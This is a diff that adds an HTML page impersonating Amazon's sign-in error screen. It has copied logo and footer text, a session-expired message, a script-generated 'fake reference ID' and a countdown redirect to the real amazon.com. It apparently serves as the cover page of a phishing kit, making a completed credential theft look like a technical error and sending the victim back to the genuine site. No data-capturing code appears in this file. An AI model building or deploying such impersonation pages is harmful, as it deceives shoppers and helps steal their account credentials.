@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authentication Error - Amazon</title>
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+    <div class="main-wrapper">
+        <!-- Amazon Logo -->
+        <div class="logo-container">
+            <div class="amazon-logo">
+                <span class="logo-text">amazon</span><span class="logo-domain">.in</span>
+                <div class="logo-smile"></div>
+            </div>
+        </div>
+
+        <!-- Error Box -->
+        <div class="login-box error-container">
+            <div class="error-header">
+                <div class="error-icon">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="12" cy="12" r="10" stroke="#d00" stroke-width="2"/>
+                        <path d="M12 7v6M12 17h.01" stroke="#d00" stroke-width="2" stroke-linecap="round"/>
+                    </svg>
+                </div>
+                <h1>There was a problem</h1>
+            </div>
+            
+            <div class="error-content">
+                <p class="error-main-text">
+                    We cannot process your request at this time due to a technical error. 
+                    For your security, we have logged you out and are redirecting you to the Amazon homepage.
+                </p>
+                
+                <div class="error-code-box">
+                    <p><strong>Error Code:</strong> AUTH-SESSION-EXPIRED</p>
+                    <p><strong>Reference ID:</strong> <span id="ref-id"></span></p>
+                    <p><strong>Timestamp:</strong> <span id="timestamp"></span></p>
+                </div>
+
+                <div class="redirect-message">
+                    <div class="loading-spinner"></div>
+                    <p>Redirecting you to Amazon...</p>
+                </div>
+
+                <div class="manual-redirect">
+                    <p>If you are not redirected automatically in <span id="countdown">5</span> seconds, 
+                       <a href="https://www.amazon.com">click here to continue</a>.
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#">Conditions of Use</a>
+                <a href="#">Privacy Notice</a>
+                <a href="#">Help</a>
+            </div>
+            <p class="copyright">© 1996–2026, Amazon.com, Inc. or its affiliates</p>
+        </div>
+    </div>
+
+    <script>
+        // Generate fake reference ID
+        document.getElementById('ref-id').textContent = 
+            'AMZ-' + Math.random().toString(36).substring(2, 15).toUpperCase();
+        
+        // Set timestamp
+        document.getElementById('timestamp').textContent = 
+            new Date().toISOString();
+        
+        // Countdown timer
+        let seconds = 5;
+        const countdownEl = document.getElementById('countdown');
+        
+        const timer = setInterval(function() {
+            seconds--;
+            countdownEl.textContent = seconds;
+            if (seconds <= 0) {
+                clearInterval(timer);
+            }
+        }, 1000);
+        
+        // Redirect after 5 seconds
+        setTimeout(function() {
+            window.location.href = "https://www.amazon.com";
+        }, 5000);
+    </script>
+</body>
+</html>
